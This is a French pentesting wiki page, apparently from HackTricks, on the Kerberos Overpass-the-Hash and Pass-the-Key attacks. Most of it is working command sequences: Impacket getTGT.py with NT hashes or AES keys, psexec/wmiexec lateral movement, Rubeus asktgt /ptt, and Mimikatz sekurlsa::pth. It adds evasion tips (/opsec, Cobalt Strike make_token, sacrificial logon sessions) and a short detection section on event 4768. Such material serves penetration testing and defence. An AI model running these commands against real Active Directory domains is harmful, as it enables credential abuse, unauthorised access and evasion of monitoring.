# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

L’attaque **Overpass The Hash/Pass The Key (PTK)** est conçue pour les environnements où le protocole NTLM traditionnel est restreint et où l’authentification Kerberos est prioritaire. Cette attaque exploite le hash NTLM ou les clés AES d’un utilisateur afin de demander des tickets Kerberos, permettant un accès non autorisé aux ressources du réseau.

À proprement parler :

- **Over-Pass-the-Hash** désigne généralement la transformation du **hash NT** en TGT Kerberos via la clé Kerberos **RC4-HMAC**.
- **Pass-the-Key** est la version plus générique, dans laquelle vous disposez déjà d’une clé Kerberos telle que **AES128/AES256** et demandez directement un TGT avec celle-ci.

Cette différence est importante dans les environnements durcis : si **RC4 est désactivé** ou n’est plus considéré par le KDC, le hash NT seul ne suffit pas et vous avez besoin d’une **clé AES** (ou du mot de passe en clair pour la dériver).

Pour exécuter cette attaque, la première étape consiste à obtenir le hash NTLM ou le mot de passe du compte de l’utilisateur ciblé. Une fois ces informations obtenues, un Ticket Granting Ticket (TGT) pour le compte peut être récupéré, permettant à l’attaquant d’accéder aux services ou aux machines auxquels l’utilisateur dispose d’autorisations.

Le processus peut être lancé avec les commandes suivantes :<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Pour les scénarios nécessitant AES256, l’option `-aesKey [AES key]` peut être utilisée :<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py` prend également en charge la demande directe d'un **service ticket** via un **AS-REQ** avec `-service <SPN>`, ce qui peut être utile lorsque vous souhaitez obtenir un ticket pour un SPN spécifique sans **TGS-REQ** supplémentaire :
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
De plus, le ticket obtenu peut être utilisé avec divers outils, notamment `smbexec.py` ou `wmiexec.py`, élargissant ainsi la portée de l'attaque.

Les problèmes rencontrés, tels que _PyAsn1Error_ ou _KDC cannot find the name_, sont généralement résolus en mettant à jour la bibliothèque Impacket ou en utilisant le hostname au lieu de l'adresse IP, afin d'assurer la compatibilité avec le KDC Kerberos.

Une autre séquence de commandes utilisant Rubeus.exe illustre un autre aspect de cette technique :<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Cette méthode reprend l’approche **Pass the Key**, en se concentrant sur la prise de contrôle et l’utilisation directe du ticket à des fins d’authentification. En pratique :

- `Rubeus asktgt` envoie lui-même la requête **Kerberos AS-REQ/AS-REP brute** et n’a pas besoin de droits admin, sauf si vous souhaitez cibler une autre session de connexion avec `/luid` ou en créer une distincte avec `/createnetonly`.
- `mimikatz sekurlsa::pth` injecte le matériel d’identification dans une session de connexion et touche donc **LSASS**, ce qui nécessite généralement des privilèges d’administrateur local ou `SYSTEM` et génère davantage de bruit du point de vue d’un EDR.

Exemples avec Mimikatz :
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
Pour respecter la sécurité opérationnelle et utiliser AES256, la commande suivante peut être appliquée :
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec` est pertinent, car le trafic généré par Rubeus diffère légèrement de celui du Kerberos natif de Windows. Notez également que `/opsec` est destiné au trafic **AES256** ; son utilisation avec RC4 nécessite généralement `/force`, ce qui annule une grande partie de son intérêt, car **RC4 dans les domaines modernes constitue déjà un signal fort**.

## Notes de détection

Chaque demande de TGT génère l’**événement `4768`** sur le DC. Dans les versions actuelles de Windows, cet événement contient des champs plus utiles que ceux mentionnés dans les anciens write-ups :

- `TicketEncryptionType` indique l’enctype utilisé pour le TGT émis. Les valeurs courantes sont `0x17` pour **RC4-HMAC**, `0x11` pour **AES128** et `0x12` pour **AES256**.<sup>[[3]](#references)</sup>
- Les événements mis à jour exposent également `SessionKeyEncryptionType`, `PreAuthEncryptionType` et les enctypes annoncés par le client, ce qui aide à distinguer une **dépendance réelle à RC4** de paramètres legacy trompeurs.
- La présence de `0x17` dans un environnement moderne indique probablement que le compte, l’hôte ou le chemin de fallback du KDC autorise encore RC4 et est donc plus favorable à l’Over-Pass-the-Hash basé sur le NT hash.

Microsoft réduit progressivement le comportement RC4 par défaut depuis les mises à jour de durcissement Kerberos de novembre 2022, et les recommandations actuellement publiées préconisent de **supprimer RC4 comme enctype supposé par défaut pour les DC AD d’ici la fin du deuxième trimestre 2026**. Du point de vue offensif, cela signifie que **Pass-the-Key avec AES** devient de plus en plus la méthode fiable, tandis que l’OpTH classique **basé uniquement sur le NT hash** continuera à échouer plus souvent dans les environnements durcis.<sup>[[3]](#references)</sup>

Pour plus de détails sur les types de chiffrement Kerberos et le comportement associé des tickets, consultez :

{{#ref}}
kerberos-authentication.md
{{#endref}}

## Version plus furtive

> [!WARNING]
> Chaque session d’ouverture de session ne peut avoir qu’un seul TGT actif à la fois ; soyez donc prudent.

1. Créez une nouvelle session d’ouverture de session avec **`make_token`** depuis Cobalt Strike.
2. Utilisez ensuite Rubeus pour générer un TGT pour la nouvelle session d’ouverture de session sans modifier celle qui existe déjà.

Vous pouvez obtenir une isolation similaire directement depuis Rubeus avec une session sacrificielle de **type d’ouverture de session 9** :
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Cela évite d’écraser le TGT de la session actuelle et est généralement plus sûr que d’importer le ticket dans votre session de connexion existante.

## Références

- [1] [Tarlogic - Kerberos (II): ¿Cómo atacar Kerberos?](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [2] [GhostPack - Rubeus (GitHub repository)](https://github.com/GhostPack/Rubeus)
- [3] [Microsoft Learn - Détecter et remédier à l’utilisation de RC4 dans Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)

{{#include ../../banners/hacktricks-training.md}}
